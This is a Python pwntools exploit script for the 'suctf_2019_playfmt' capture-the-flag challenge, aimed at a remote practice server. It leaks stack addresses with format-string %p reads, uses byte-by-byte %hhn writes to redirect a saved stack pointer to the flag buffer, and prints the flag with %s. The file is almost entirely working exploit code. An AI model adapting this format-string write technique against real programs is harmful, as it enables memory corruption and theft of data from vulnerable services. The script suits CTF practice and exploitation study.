#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './suctf_2019_playfmt'
context.log_level = 'debug'
context.timeout = 240

io = process('./suctf_2019_playfmt')
io = remote('node5.buuoj.cn', 28440)
elf = ELF('./suctf_2019_playfmt')
libc = ELF('./libc-2.27.buu.so')
one_gadgets = [0x3cdea, 0x3cdec, 0x3cdf0, 0x3cdf7, 0x6749f, 0x674a0, 0x1357ae, 0x1357af]

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv

# context.log_level = "debug"
do_fmt_ebp_offset = 6
play_ebp_offset = 14
main_ebp_offset = 26


def get_target_offset_value(offset , name):
    payload = f"%{offset}$p,,,"
    s(payload)
    value = int(ru(b',,,')[:-3] , 16)
    leak(name, value)
    return value

def modify_last_byte(last_byte , offset):
    payload = "%" + str(last_byte) + "c" + f"%{offset}$hhn,,,"
    s(payload)
    ru(b',,,')

def modify(addr , value , ebp_offset , ebp_1_offset):
    addr_last_byte = addr & 0xff
    for i in range(4):
        now_value = (value >> (i * 8)) & 0xff
        modify_last_byte(addr_last_byte + i ,  ebp_offset)
        modify_last_byte(now_value , ebp_1_offset)


ru(b'=====================')
ru(b'=====================')
# leak ebp_1_addr then get ebp_addr
play_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  "logo_ebp") 
# get_ebp_addr
main_ebp_addr = get_target_offset_value(do_fmt_ebp_offset,  "main_ebp")
# flag_class_ptr_addr = main_ebp_addr + 0x10
# flag_class_ptr_offset = main_ebp_offset - 4
flag_class_ptr_offset = 19
flag_addr = get_target_offset_value(flag_class_ptr_offset , "flag_addr") - 0x420
log.info(hex(flag_addr))

# puts_plt = elf.plt["puts"]
modify(main_ebp_addr + 4 , flag_addr , do_fmt_ebp_offset , play_ebp_offset)
# gdb.attach(p)
payload = f"%{play_ebp_offset + 1}$s\x00"
s(payload)
# log.info("flag_addr : " + hex(flag_addr))

# p.sendline("quit")

ia()
